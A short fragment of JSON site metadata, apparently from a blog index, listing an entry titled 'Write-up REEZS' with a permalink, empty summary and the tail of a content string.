readingğŸ˜˜!\n","externalUrl":null,"permalink":"/re/1761234068225-reezs/","section":"Res","summary":"","title":"Write-up REEZS","type":"re"}]